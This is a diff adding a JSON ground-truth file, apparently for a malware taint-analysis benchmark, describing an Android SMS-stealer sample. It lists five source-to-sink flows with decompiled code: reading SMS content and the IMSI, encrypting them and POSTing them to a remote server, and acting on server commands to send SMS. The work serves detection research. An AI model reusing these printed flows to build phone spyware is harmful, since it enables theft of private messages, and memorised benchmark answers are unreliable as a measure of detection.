@@ -1,0 +1,453 @@
+{
+  "fileName": "smsstealer_kysn_assassincreed_android_samp.apk",
+  "day": "2019-04-08",
+  "findings": [
+    {
+      "source": {
+        "statement": "Cursor cur = context.getContentResolver().query(Uri.parse(\"content://sms\"), null, null, null, null);",
+        "methodName": "public void onReceive(Context context, Intent intent)",
+        "className": "com.dsifakf.aoakmnq.GetAll",
+        "lineNo": 45,
+        "targetName": "query",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r16 = virtualinvoke $r15.<android.content.ContentResolver: android.database.Cursor query(android.net.Uri,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String)>($r14, null, null, null, null)"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "httpClient.execute(httpPost2);",
+        "methodName": "public void run()",
+        "className": "com.dsifakf.aoakmnq.GetAll.AnonymousClass1",
+        "lineNo": 84,
+        "targetName": "execute",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "interfaceinvoke $r2.<org.apache.http.client.HttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r1)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "String tp = cur.getString(cur.getColumnIndex(\"type\"));",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.dsifakf.aoakmnq.GetAll",
+          "lineNo": 48,
+          "ID": 1
+        },
+        {
+          "statement": "PostBody = new StringBuilder(String.valueOf(PostBody)).append(\"<v><g>\").append(adr).append(\"</g><f>\").append(tp).append(\"</f><m>\").append(cur.getString(cur.getColumnIndexOrThrow(\"body\"))).append(\"</m></v>\").toString();",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.dsifakf.aoakmnq.GetAll",
+          "lineNo": 73,
+          "ID": 2
+        },
+        {
+          "statement": "PostBody = Secure.bytesToHex(parse.encrypt(Uri.encode(PostBody.replaceAll(\"[\\r\\n]\", \"\"))));",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.dsifakf.aoakmnq.GetAll",
+          "lineNo": 64,
+          "ID": 3
+        },
+        {
+          "statement": "strEntity = new StringEntity(\"1=\" + devimsi + \"&3=\" + PostBody);",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.dsifakf.aoakmnq.GetAll",
+          "lineNo": 73,
+          "ID": 4
+        },
+        {
+          "statement": "httpPost.setEntity(strEntity);",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.dsifakf.aoakmnq.GetAll",
+          "lineNo": 74,
+          "ID": 5
+        },
+        {
+          "statement": "final HttpPost httpPost2 = httpPost;",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.dsifakf.aoakmnq.GetAll",
+          "lineNo": 80,
+          "ID": 6
+        }
+      ],
+      "attributes": {
+        "interComponentCommunication": true,
+        "lifecycle": true,
+        "threading": true
+      },
+      "ID": 1,
+      "description": "This malicious flow reads the types of sms messages and send to a remote server via an HTTP POST request.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "Cursor cur = context.getContentResolver().query(Uri.parse(\"content://sms\"), null, null, null, null);",
+        "methodName": "public void onReceive(Context context, Intent intent)",
+        "className": "com.dsifakf.aoakmnq.GetAll",
+        "lineNo": 45,
+        "targetName": "query",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r16 = virtualinvoke $r15.<android.content.ContentResolver: android.database.Cursor query(android.net.Uri,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String)>($r14, null, null, null, null)"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "httpClient.execute(httpPost2);",
+        "methodName": "public void run()",
+        "className": "com.dsifakf.aoakmnq.GetAll.AnonymousClass1",
+        "lineNo": 84,
+        "targetName": "execute",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "interfaceinvoke $r2.<org.apache.http.client.HttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r1)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "String adr = cur.getString(cur.getColumnIndex(\"address\"));",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.dsifakf.aoakmnq.GetAll",
+          "lineNo": 49,
+          "ID": 1
+        },
+        {
+          "statement": "PostBody = new StringBuilder(String.valueOf(PostBody)).append(\"<v><g>\").append(adr).append(\"</g><f>\").append(tp).append(\"</f><m>\").append(cur.getString(cur.getColumnIndexOrThrow(\"body\"))).append(\"</m></v>\").toString();",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.dsifakf.aoakmnq.GetAll",
+          "lineNo": 73,
+          "ID": 2
+        },
+        {
+          "statement": "PostBody = Secure.bytesToHex(parse.encrypt(Uri.encode(PostBody.replaceAll(\"[\\r\\n]\", \"\"))));",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.dsifakf.aoakmnq.GetAll",
+          "lineNo": 64,
+          "ID": 3
+        },
+        {
+          "statement": "strEntity = new StringEntity(\"1=\" + devimsi + \"&3=\" + PostBody);",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.dsifakf.aoakmnq.GetAll",
+          "lineNo": 73,
+          "ID": 4
+        },
+        {
+          "statement": "httpPost.setEntity(strEntity);",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.dsifakf.aoakmnq.GetAll",
+          "lineNo": 74,
+          "ID": 5
+        },
+        {
+          "statement": "final HttpPost httpPost2 = httpPost;",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.dsifakf.aoakmnq.GetAll",
+          "lineNo": 80,
+          "ID": 6
+        }
+      ],
+      "attributes": {
+        "lifecycle": true,
+        "threading": true
+      },
+      "ID": 2,
+      "description": "This malicious flow reads the addresses of sms messages and send to a remote server via an HTTP POST request.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "devimsi = Secure.bytesToHex(parse.encrypt(TelManager.getSubscriberId()));",
+        "methodName": "public void onReceive(Context context, Intent intent)",
+        "className": "com.dsifakf.aoakmnq.GetAll",
+        "lineNo": 62,
+        "targetName": "getSubscriberId",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r3 = virtualinvoke $r10.<android.telephony.TelephonyManager: java.lang.String getSubscriberId()>()"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "httpClient.execute(httpPost2);",
+        "methodName": "public void run()",
+        "className": "com.dsifakf.aoakmnq.GetAll.AnonymousClass1",
+        "lineNo": 84,
+        "targetName": "execute",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "interfaceinvoke $r2.<org.apache.http.client.HttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r1)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "strEntity = new StringEntity(\"1=\" + devimsi + \"&3=\" + PostBody);",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.dsifakf.aoakmnq.GetAll",
+          "lineNo": 73,
+          "ID": 1
+        },
+        {
+          "statement": "httpPost.setEntity(strEntity);",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.dsifakf.aoakmnq.GetAll",
+          "lineNo": 74,
+          "ID": 2
+        },
+        {
+          "statement": "final HttpPost httpPost2 = httpPost;",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.dsifakf.aoakmnq.GetAll",
+          "lineNo": 80,
+          "ID": 3
+        }
+      ],
+      "attributes": {
+        "lifecycle": true,
+        "threading": true
+      },
+      "ID": 3,
+      "description": "This malicious flow reads the IMSI of the device and sends it to a remote server via an HTTP POST request.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "BufferedReader inp = new BufferedReader(new InputStreamReader(this.httpConnection.getInputStream()));",
+        "methodName": "public String dataGet()",
+        "className": "com.dsifakf.aoakmnq.Connect3",
+        "lineNo": 44,
+        "targetName": "getInputStream",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r10 = virtualinvoke $r7.<java.net.HttpURLConnection: java.io.InputStream getInputStream()>()"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "editor.commit();",
+        "methodName": "private void setParam2(String Param2)",
+        "className": "com.dsifakf.aoakmnq.CheckUpdate.AnonymousClass1",
+        "lineNo": 124,
+        "targetName": "commit",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "interfaceinvoke $r5.<android.content.SharedPreferences$Editor: boolean commit()>()"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "String stL = inp.readLine();",
+          "methodName": "public String dataGet()",
+          "className": "com.dsifakf.aoakmnq.Connect3",
+          "lineNo": 48,
+          "ID": 1
+        },
+        {
+          "statement": "resp.append(stL);",
+          "methodName": "public String dataGet()",
+          "className": "com.dsifakf.aoakmnq.Connect3",
+          "lineNo": 48,
+          "ID": 2
+        },
+        {
+          "statement": "uncryptResult = new String(parse.decrypt(resp.toString()));",
+          "methodName": "public String dataGet()",
+          "className": "com.dsifakf.aoakmnq.Connect3",
+          "lineNo": 56,
+          "ID": 3
+        },
+        {
+          "statement": "return uncryptResult;",
+          "methodName": "public String dataGet()",
+          "className": "com.dsifakf.aoakmnq.Connect3",
+          "lineNo": 56,
+          "ID": 4
+        },
+        {
+          "statement": "return new JSONObject(dataGet());",
+          "methodName": "public JSONObject getJSONObject()",
+          "className": "com.dsifakf.aoakmnq.Connect3",
+          "lineNo": 29,
+          "ID": 5
+        },
+        {
+          "statement": "this.resultObject = this.connect3.getJSONObject();",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.dsifakf.aoakmnq.Connect1",
+          "lineNo": 62,
+          "ID": 6
+        },
+        {
+          "statement": "this.compiteResult.finish(this.resultObject);",
+          "methodName": "public void onPostExecute(Void result)",
+          "className": "com.dsifakf.aoakmnq.Connect1",
+          "lineNo": 51,
+          "ID": 7
+        },
+        {
+          "statement": "if (!object.isNull(\"fr\")) {",
+          "methodName": "public void finish(JSONObject object)",
+          "className": "com.dsifakf.aoakmnq.CheckUpdate.AnonymousClass1",
+          "lineNo": 67,
+          "ID": 8
+        },
+        {
+          "statement": "setParam2(object.getString(\"fr\"));",
+          "methodName": "public void finish(JSONObject object)",
+          "className": "com.dsifakf.aoakmnq.CheckUpdate.AnonymousClass1",
+          "lineNo": 68,
+          "ID": 9
+        },
+        {
+          "statement": "Param2Decode = Secure.bytesToHex(parse.encrypt(Param2));",
+          "methodName": "private void setParam2(String Param2)",
+          "className": "com.dsifakf.aoakmnq.CheckUpdate.AnonymousClass1",
+          "lineNo": 120,
+          "ID": 10
+        },
+        {
+          "statement": "editor.putString(\"cd\", Param2Decode);",
+          "methodName": "private void setParam2(String Param2)",
+          "className": "com.dsifakf.aoakmnq.CheckUpdate.AnonymousClass1",
+          "lineNo": 123,
+          "ID": 11
+        }
+      ],
+      "attributes": {
+        "appendToString": true,
+        "nonStaticField": true,
+        "pathConstraints": true,
+        "threading": true
+      },
+      "ID": 4,
+      "description": "This malicious flow reads command and decrypts information from a remote server and store data into shared perference.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "BufferedReader inp = new BufferedReader(new InputStreamReader(this.httpConnection.getInputStream()));",
+        "methodName": "public String dataGet()",
+        "className": "com.dsifakf.aoakmnq.Connect3",
+        "lineNo": 44,
+        "targetName": "getInputStream",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r10 = virtualinvoke $r7.<java.net.HttpURLConnection: java.io.InputStream getInputStream()>()"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "sendMsg.sendMultipartTextMessage(Number, null, sendMsg.divideMessage(DecodeText), null, null);",
+        "methodName": "private void GoMessage(String Number, String Text)",
+        "className": "com.dsifakf.aoakmnq.CheckUpdate.AnonymousClass1",
+        "lineNo": 111,
+        "targetName": "sendMultipartTextMessage",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r4.<android.telephony.gsm.SmsManager: void sendMultipartTextMessage(java.lang.String,java.lang.String,java.util.ArrayList,java.util.ArrayList,java.util.ArrayList)>($r1, null, $r5, null, null)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "String stL = inp.readLine();",
+          "methodName": "public String dataGet()",
+          "className": "com.dsifakf.aoakmnq.Connect3",
+          "lineNo": 48,
+          "ID": 1
+        },
+        {
+          "statement": "resp.append(stL);",
+          "methodName": "public String dataGet()",
+          "className": "com.dsifakf.aoakmnq.Connect3",
+          "lineNo": 48,
+          "ID": 2
+        },
+        {
+          "statement": "uncryptResult = new String(parse.decrypt(resp.toString()));",
+          "methodName": "public String dataGet()",
+          "className": "com.dsifakf.aoakmnq.Connect3",
+          "lineNo": 56,
+          "ID": 3
+        },
+        {
+          "statement": "return uncryptResult;",
+          "methodName": "public String dataGet()",
+          "className": "com.dsifakf.aoakmnq.Connect3",
+          "lineNo": 56,
+          "ID": 4
+        },
+        {
+          "statement": "return new JSONObject(dataGet());",
+          "methodName": "public JSONObject getJSONObject()",
+          "className": "com.dsifakf.aoakmnq.Connect3",
+          "lineNo": 29,
+          "ID": 5
+        },
+        {
+          "statement": "this.resultObject = this.connect3.getJSONObject();",
+          "methodName": "public Void doInBackground(Void... params)",
+          "className": "com.dsifakf.aoakmnq.Connect1",
+          "lineNo": 62,
+          "ID": 6
+        },
+        {
+          "statement": "this.compiteResult.finish(this.resultObject);",
+          "methodName": "public void onPostExecute(Void result)",
+          "className": "com.dsifakf.aoakmnq.Connect1",
+          "lineNo": 51,
+          "ID": 7
+        },
+        {
+          "statement": "GoMessage(object.getString(\"nr\"), object.getString(\"tt\"));",
+          "methodName": "public void finish(JSONObject object)",
+          "className": "com.dsifakf.aoakmnq.CheckUpdate.AnonymousClass1",
+          "lineNo": 62,
+          "ID": 8
+        },
+        {
+          "statement": "DecodeText = URLDecoder.decode(Text, \"UTF-8\");",
+          "methodName": "private void GoMessage(String Number, String Text)",
+          "className": "com.dsifakf.aoakmnq.CheckUpdate.AnonymousClass1",
+          "lineNo": 107,
+          "ID": 9
+        }
+      ],
+      "attributes": {
+        "appendToString": true,
+        "interComponentCommunication": true,
+        "lifecycle": true,
+        "nonStaticField": true,
+        "pathConstraints": true,
+        "threading": true
+      },
+      "ID": 5,
+      "description": "This malicious flow reads command and decrypts information from a remote server and sends a multi-part text based SMS.",
+      "isNegative": false
+    }
+  ]
+}
